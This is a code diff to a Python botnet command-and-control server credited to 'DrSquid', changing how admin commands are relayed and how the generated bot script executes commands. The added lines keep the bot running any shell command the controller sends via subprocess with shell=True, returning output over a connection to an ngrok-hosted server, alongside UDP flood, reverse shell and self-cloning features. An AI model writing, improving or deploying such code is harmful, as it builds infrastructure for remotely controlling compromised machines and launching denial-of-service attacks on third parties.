@@ -566,10 +566,11 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                             if connect in self.admin_conn:
                                 pass
                             else:
-                                try:
-                                    connect.send(msg.encode())
-                                except:
-                                    connect.send(msg)
+                                if "!login" not in msg and "!help" not in msg:
+                                    try:
+                                        connect.send(msg.encode())
+                                    except:
+                                        connect.send(msg)
                 if msg == "" or msg == " ":
                     pass
                 else:
@@ -883,21 +884,25 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] - Fixed Error in Stopping DDoS Attacks(tried to call a bool object and not function).
 [+] - Made password list optional(however brute forcing cannot happen).
 [+] - Added '!cloneself' Command.
+[+] - Upgraded reverse shell messages.
+[+] - Made it so that '!clear', '!genscript' and '!genadminscript' are not sent to the clients.
                     """)
-                if self.instruction != "!clear":
+                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip():
+                    pass
+                else:
                     if len(self.ssh_bots) != 0:
                         sendtossh = threading.Thread(target=self.send_ssh, args=(self.instruction,))
                         sendtossh.start()
-                self.log(f"\n[(SERVER)---->(ADMINS)]: Sent '{self.instruction}' to the bots.")
-                for conn in self.conn_list:
-                    try:
-                        if conn in self.admin_conn:
-                            conn.send(f"[(SERVER)]: Sent '{self.instruction}' to the bots.".encode())
-                        else:
-                            conn.send(self.instruction.encode())
-                    except:
-                        self.log(f"\n[(ERROR)]: Unable to send message to {conn}.")
-                self.log(f"\n[(SERVER)]: {self.instruction}")
+                    self.log(f"\n[(SERVER)---->(ADMINS)]: Sent '{self.instruction}' to the bots.")
+                    for conn in self.conn_list:
+                        try:
+                            if conn in self.admin_conn:
+                                conn.send(f"[(SERVER)]: Sent '{self.instruction}' to the bots.".encode())
+                            else:
+                                conn.send(self.instruction.encode())
+                        except:
+                            self.log(f"\n[(ERROR)]: Unable to send message to {conn}.")
+                    self.log(f"\n[(SERVER)]: {self.instruction}")
             except Exception as e:
                 self.log(f"\n[(ERROR)]: {str(e)}")
     def gen_admin(self):
@@ -4839,8 +4844,9 @@ OS:       {sys.platform}
                     self.udp_flood = threading.Thread(target=self.udpflood.UDP_Flood)
                     self.udp_flood.start()
                 else:
-                    output = os.popen(self.msg).read()
-                    self.send(output)
+                    cmd = subprocess.Popen(self.msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    stdout = cmd.stdout.read()+cmd.stderr.read()
+                    self.send(stdout)
         except Exception as e:
             self.send(f"Error in script: {e}".encode())
 ip = '""" + self.ngroklink + """'
